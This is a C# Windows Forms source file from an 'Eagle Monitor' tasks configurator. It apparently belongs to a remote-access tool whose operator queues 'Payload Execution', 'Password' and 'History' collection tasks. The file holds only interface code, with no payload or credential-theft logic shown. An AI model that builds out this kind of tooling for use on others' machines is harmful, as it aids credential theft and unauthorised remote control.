using EagleMonitor.Controls;
using System;
using System.Diagnostics;
using System.Windows.Forms;
using static Eagle_Monitor_Tasks_Configurator.Helpers;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_Tasks_Configurator
{
    public partial class Main : FormPattern
    {

        public Main()
        {
            InitializeComponent();
        }

        private void Main_Load(object sender, EventArgs e)
        {
            imageList1.Images.Add(Properties.Resources.executable_2x);
            imageList1.Images.Add(Properties.Resources.file_dll_2x);
            imageList1.Images.Add(Properties.Resources.file_binary_2x);
            imageList1.Images.Add(Properties.Resources.history_2x);
            imageList1.Images.Add(Properties.Resources.control_password_2x);
        }

        private void taskListView_DragDrop(object sender, DragEventArgs e)
        {
            string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
            TasksHelpers.PayloadDragDropAdder(files, this.taskListView);
        }

        private void taskListView_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.Move;
        }

        private void Main_Shown(object sender, EventArgs e)
        {
            TasksHelpers.TasksParser(this.taskListView);
        }

        private void historyToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ListViewItem history = new ListViewItem("History");
            history.ImageIndex = 3;
            taskListView.Items.Add(history);
        }

        private void passwordsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem password = new ListViewItem("Password");
            password.ImageIndex = 4;
            taskListView.Items.Add(password);
        }

        private void saveTasksToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            TasksHelpers.SaveTasks(this.taskListView);
        }

        private void payloadExecutionToolStripMenuItem_Click(object sender, EventArgs e)
        {
           TasksHelpers.PayloadAdder(this.taskListView);
        }

        private void removeTaskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach(ListViewItem item in taskListView.SelectedItems)
                item.Remove();
        }
        private void closeButton_Click(object sender, EventArgs e)
        {
            TasksHelpers.SaveTasks(this.taskListView);
            NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
    }
}
